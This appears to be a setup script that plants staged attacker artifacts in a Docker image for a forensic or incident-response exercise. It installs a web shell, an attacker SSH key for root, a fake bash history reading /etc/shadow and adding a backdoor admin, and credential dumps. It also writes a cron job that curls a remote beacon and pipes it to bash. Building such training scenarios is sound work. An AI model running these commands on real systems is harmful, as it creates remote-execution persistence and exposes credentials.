#!/bin/bash
# Plant static post-attack artifacts for server_1 at Docker build time.
# These are baked into the image so they are always present.

# --- Auth log (baseline cron sessions) ---
cat /opt/artifacts/auth.log > /var/log/auth.log

# --- Nginx log artifacts (written at build time; nginx appends after) ---
mkdir -p /var/log/nginx
cat /opt/artifacts/nginx_access.log > /var/log/nginx/access.log
cat /opt/artifacts/nginx_error.log > /var/log/nginx/error.log

# --- Dropped web shell ---
cp /opt/artifacts/cmd.php /var/www/html/cmd.php

# --- SSH persistence: attacker planted key for root access ---
mkdir -p /root/.ssh
cp /opt/artifacts/authorized_keys /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# --- Root bash history showing web shell usage and persistence ---
cat > /root/.bash_history << 'HIST'
id
whoami
cat /etc/passwd
cat /etc/shadow
ip addr
ss -tlnp
ps aux
sqlite3 /var/www/html/portal.db "SELECT * FROM users;"
sqlite3 /var/www/html/portal.db "INSERT INTO users (username, password, role) VALUES ('backdoor', 'hacked', 'admin');"
ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
echo "*/15 * * * * root curl -s http://192.168.1.50:8443/beacon|bash" > /etc/cron.d/.nginx_cache_clean
chmod 644 /etc/cron.d/.nginx_cache_clean
HIST

# --- Fake attacker PHP session ---
echo "attacker_session|s:5:\"admin\";role|s:5:\"admin\";" > /tmp/sess_attacker_session_id

# --- Exfiltrated credential files ---
mkdir -p /tmp/.www_cache
cp /etc/passwd /tmp/.www_cache/passwd_dump
cat /etc/shadow > /tmp/.www_cache/shadow_dump 2>/dev/null || echo "root:*:19394:0:99999:7:::" > /tmp/.www_cache/shadow_dump

# --- Persistence: cron job for C2 beacon every 15 minutes ---
cat > /etc/cron.d/.nginx_cache_clean << 'CRON'
*/15 * * * * root curl -s http://192.168.1.50:8443/beacon | bash >/dev/null 2>&1
CRON
chmod 644 /etc/cron.d/.nginx_cache_clean
